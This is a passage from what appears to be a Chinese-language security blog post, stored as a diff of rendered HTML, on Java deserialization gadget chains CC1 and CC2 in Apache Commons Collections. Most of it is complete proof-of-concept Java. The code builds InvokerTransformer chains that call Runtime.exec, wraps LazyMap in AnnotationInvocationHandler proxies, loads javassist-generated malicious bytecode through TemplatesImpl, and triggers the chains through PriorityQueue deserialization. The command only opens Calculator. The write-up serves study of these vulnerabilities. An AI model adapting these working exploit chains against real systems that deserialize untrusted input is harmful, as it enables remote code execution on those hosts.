+        <span class="nc">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span><span class="n">AnnotationInvocationHandler_Constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Retention</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">proxy_map</span><span class="o">);</span>
+
+        <span class="nc">ObjectOutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"bin/CC1Poc.bin"</span><span class="o">));</span>
+        <span class="n">outputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">handler</span><span class="o">);</span>
+        <span class="n">outputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="nc">ObjectInputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="s">"bin/CC1Poc.bin"</span><span class="o">));</span>
+        <span class="n">inputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h3 id="前置知识-1">前置知识</h3>
+
+<h4 id="动态代理">动态代理</h4>
+
+<p>之前学的文章： <a href="https://theoyu.top/java/fundation/DynamicProxy#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86">DynamicProxy</a></p>
+
+<h3 id="构造chain-3">构造chain</h3>
+
+<p>cc1和<code class="language-plaintext highlighter-rouge">LazyMap.get()</code>相结合的地方，在 <strong>AnnotationInvocationHandler.class</strong>的<code class="language-plaintext highlighter-rouge">invoke()</code>方法里：</p>
+
+<p><img src="../../assets/images/image-20220222144514080.png" alt="image-20220222144514080" /></p>
+
+<p>我们只需要把<code class="language-plaintext highlighter-rouge">this.memberValues</code>声明为 <strong>LazyMap</strong>对象即可。</p>
+
+<p>回到动态代理，如果我们将<strong>AnnotationInvocationHandler</strong>作为被代理类，这样当代理类执行任意方法的时候都会执行被代理类中的<strong>invoke</strong>方法，也就是执行<strong>AnnotationInvocationHandler</strong>中的<strong>invoke</strong>方法。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test1</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="nc">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"open  -a Calculator"</span><span class="o">})</span>
+        <span class="o">};</span>
+        <span class="nc">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+
+        <span class="nc">HashMap</span> <span class="n">innermap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
+        <span class="n">innermap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span><span class="s">"abcd"</span><span class="o">);</span>
+        <span class="nc">LazyMap</span> <span class="n">map</span> <span class="o">=</span> <span class="o">(</span><span class="nc">LazyMap</span><span class="o">)</span> <span class="nc">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innermap</span><span class="o">,</span><span class="n">transformerChain</span><span class="o">);</span>
+
+        <span class="nc">Constructor</span> <span class="n">handler_constructor</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">handler_constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="c1">// 创建一个与代理对象相关联的InvocationHandler</span>
+        <span class="nc">InvocationHandler</span> <span class="n">map_handler</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span> <span class="n">handler_constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Retention</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">map</span><span class="o">);</span>
+        <span class="c1">// 创建代理对象proxy_map来代理map，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法</span>
+        <span class="nc">Map</span> <span class="n">proxy_map</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Map</span><span class="o">)</span> <span class="nc">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="nc">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">map_handler</span><span class="o">);</span>
+        <span class="n">proxy_map</span><span class="o">.</span><span class="na">entrySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>最后，再反射创建<code class="language-plaintext highlighter-rouge">AnnotationInvocationHandler</code>实例对象，把代理类封装写入即可。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Map</span> <span class="n">proxy_map</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Map</span><span class="o">)</span> <span class="nc">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="nc">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">map_handler</span><span class="o">);</span>
+<span class="nc">Constructor</span> <span class="n">AnnotationInvocationHandler_Constructor</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+<span class="n">AnnotationInvocationHandler_Constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="c1">//反射创建实例对象</span>
+<span class="nc">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span><span class="n">AnnotationInvocationHandler_Constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Retention</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">proxy_map</span><span class="o">);</span>
+</code></pre></div></div>
+
+<h2 id="cc-2">CC 2</h2>
+
+<p>cc2无论是 <strong>readobject</strong>的复写点，还是 <strong>sink</strong>都是和之前不一样，算是全新的一个方向。</p>
+
+<h3 id="利用条件-1">利用条件</h3>
+
+<ul>
+  <li><strong>commons-collections4: 4.0</strong></li>
+  <li>jdk 版本暂无限制</li>
+</ul>
+
+<p>mvn：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;dependencies&gt;
+  &lt;dependency&gt;
+    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+    &lt;version&gt;4.0&lt;/version&gt;
+  &lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre></div></div>
+
+<h3 id="前置知识-2">前置知识</h3>
+
+<h4 id="heaps-and-priority-queues"><a href="https://github.com/yuuuuu422/CS61B-sp18#heaps-and-priority-queues">Heaps and Priority Queues</a></h4>
+
+<h4 id="javassist"><a href="https://theoyu.top/2022/01/19/jvmANDbytecode.html#javassist">javassist</a></h4>
+
+<h4 id="templatesimpl">TemplatesImpl</h4>
+
+<p>TemplatesImpl位于rt.jar下的sun包里，其内部对loadClass进行了重写</p>
+
+<p>调用链如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TemplatesImpl.getOutputProperties()
+  TemplatesImpl.newTransformer()
+    TemplatesImpl.getTransletInstance()
+        TemplatesImpl.defineTransletClasses()
+            TransletClassLoader.defineClass()
+</code></pre></div></div>
+
+<p><img src="../../assets/images/image-20220222195714335.png" alt="image-20220222195714335" /></p>
+
+<p>利用javassist，写一个恶意字节码，利用<code class="language-plaintext highlighter-rouge">defineClass()</code>本地执行。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test2</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="nc">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+        <span class="nc">CtClass</span> <span class="n">clas</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"TempTest"</span><span class="o">);</span>
+        <span class="c1">//继承于AbstractTranslet</span>
+        <span class="n">clas</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="nc">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()));</span>
+
+        <span class="nc">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"java.lang.Runtime.getRuntime().exec(\"open -a Calculator \");"</span><span class="o">;</span>
+        <span class="nc">CtConstructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">clas</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">();</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+<span class="c1">//        clas.writeFile("./");</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">clas</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+
+        <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+
+        <span class="nc">Class</span> <span class="n">temp</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="o">);</span>
+        <span class="n">setFieled</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">temp</span><span class="o">,</span><span class="s">"_name"</span><span class="o">,</span><span class="s">"tttt"</span><span class="o">);</span>
+        <span class="n">setFieled</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">temp</span><span class="o">,</span><span class="s">"_class"</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">setFieled</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">temp</span><span class="o">,</span><span class="s">"_bytecodes"</span><span class="o">,</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">bytes</span><span class="o">});</span>
+        <span class="n">setFieled</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">temp</span><span class="o">,</span><span class="s">"_tfactory"</span><span class="o">,</span><span class="k">new</span> <span class="nc">TransformerFactoryImpl</span><span class="o">());</span>
+
+        <span class="n">templates</span><span class="o">.</span><span class="na">getOutputProperties</span><span class="o">();</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieled</span><span class="o">(</span><span class="nc">TemplatesImpl</span> <span class="n">templates</span><span class="o">,</span><span class="nc">Class</span> <span class="n">clas</span> <span class="o">,</span><span class="nc">String</span> <span class="n">fieled</span><span class="o">,</span><span class="nc">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">Field</span> <span class="n">_field</span> <span class="o">=</span> <span class="n">clas</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieled</span><span class="o">);</span>
+        <span class="n">_field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">_field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">obj</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>四个反射是为了调用链能够顺利走到 <strong>defineClass</strong>，恶意类需要继承于 <strong>AbstractTranslet</strong>：我们当然希望唯一的这一个方法是main class</p>
+
+<p><img src="../../assets/images/image-20220222202515578.png" alt="image-20220222202515578" /></p>
+
+<h3 id="从kick---off出发">从『kick - off』出发</h3>
+
+<p><strong>readObject</strong>的复写点在 <strong>PriorityQueue</strong>，简单梳理就是以下流程：</p>
+
+<p><img src="../../assets/images/image-20220222180505045.png" alt="image-20220222180505045" /></p>
+
+<p>如果我们控制了<code class="language-plaintext highlighter-rouge">PriorityQueue.comparator</code>，就可以使第三个流程走向<code class="language-plaintext highlighter-rouge">siftDownUsingComparator()</code>,进而走向<code class="language-plaintext highlighter-rouge">comparator.compare()</code>，接下来就是寻找哪些实现了Comparator接口的类拥有compare方法，目标锁定到<strong>TransformingComparator</strong>：</p>
+
+<p><img src="../../assets/images/image-20220222185634657.png" alt="image-20220222185634657" /></p>
+
+<p>这可控的 <code class="language-plaintext highlighter-rouge">transformer.transform</code>，谁看了不落泪。</p>
+
+<p>Poc如下：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test1</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{</span>
+                <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="nc">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+                <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"open  -a Calculator"</span><span class="o">})</span>
+        <span class="o">};</span>
+
+        <span class="nc">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+        <span class="nc">TransformingComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TransformingComparator</span><span class="o">(</span><span class="n">transformerChain</span><span class="o">);</span>
+        <span class="nc">PriorityQueue</span> <span class="n">pq</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PriorityQueue</span><span class="o">(</span><span class="mi">2</span><span class="o">);</span>
+        <span class="n">pq</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+        <span class="n">pq</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="mi">2</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.util.PriorityQueue"</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"comparator"</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">pq</span><span class="o">,</span><span class="n">comparator</span><span class="o">);</span>
+        <span class="nc">ObjectOutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"bin/CC2Test1.bin"</span><span class="o">));</span>
+        <span class="n">outputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">pq</span><span class="o">);</span>
+        <span class="n">outputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="nc">ObjectInputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="s">"bin/CC2Test1.bin"</span><span class="o">));</span>
+        <span class="n">inputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>注意优先级队列需要先add两个元素，因为堆初始化时需要<code class="language-plaintext highlighter-rouge">size&gt;=2</code>才能继续往下(流程图的第二张)。</p>
+
+<p>但这并不是完全意义上的cc2，这里的sink还是<code class="language-plaintext highlighter-rouge">InvokerTransformer.transform()</code>，只能执行命令，但是 <strong>TemplatesImpl</strong>可以加载恶意字节码，属于执行代码，杀伤力更大。</p>
+
+<p>那么我们现在的目标就是，找到一个实现了<strong>Tranformer</strong>接口的类，他的<strong>transform</strong>方法和<strong>TransformerImpl</strong>的<strong>newTransformer</strong>结合到一起。</p>
+
+<p>等等，回到最初的起点，<code class="language-plaintext highlighter-rouge">InvokerTransformer.transform(Object input)</code>，不就是反射调用了<code class="language-plaintext highlighter-rouge">input.iArgs() 吗</code>，那我们只要反射构造就可以运行到<code class="language-plaintext highlighter-rouge">TransformerImpl.newTransformer()</code></p>
+
+<h3 id="最终poc">最终poc</h3>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test3</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.apache.commons.collections4.functors.InvokerTransformer"</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+      <span class="c1">//methodName</span>
+        <span class="nc">InvokerTransformer</span> <span class="n">transformer</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvokerTransformer</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="s">"newTransformer"</span><span class="o">);</span>
+        <span class="nc">TransformingComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TransformingComparator</span><span class="o">(</span><span class="n">transformer</span><span class="o">);</span>
+        <span class="nc">PriorityQueue</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PriorityQueue</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+
+        <span class="nc">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="nc">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+        <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="nc">ClassClassPath</span><span class="o">(</span><span class="nc">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
+        <span class="nc">CtClass</span> <span class="n">cc</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"Cat"</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"java.lang.Runtime.getRuntime().exec(\"open  -a Calculator\");"</span><span class="o">;</span>
+        <span class="n">cc</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+        <span class="n">cc</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="nc">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()));</span> 
+
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">cc</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">targetByteCodes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">classBytes</span><span class="o">};</span>
+        <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="n">targetByteCodes</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"name"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_class"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+        <span class="nc">Object</span><span class="o">[]</span> <span class="n">queue_array</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="n">templates</span><span class="o">,</span><span class="mi">1</span><span class="o">};</span>
+
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span><span class="s">"queue"</span><span class="o">,</span><span class="n">queue_array</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span><span class="s">"size"</span><span class="o">,</span><span class="mi">2</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span><span class="s">"comparator"</span><span class="o">,</span><span class="n">comparator</span><span class="o">);</span>
+
+
+        <span class="nc">ObjectOutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"bin/CC2Test3.bin"</span><span class="o">));</span>
+        <span class="n">outputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">queue</span><span class="o">);</span>
+        <span class="n">outputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="nc">ObjectInputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="s">"bin/CC2Test3.bin"</span><span class="o">));</span>
+        <span class="n">inputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="kd">final</span> <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Field</span> <span class="nf">getField</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+            <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="nc">NoSuchFieldException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
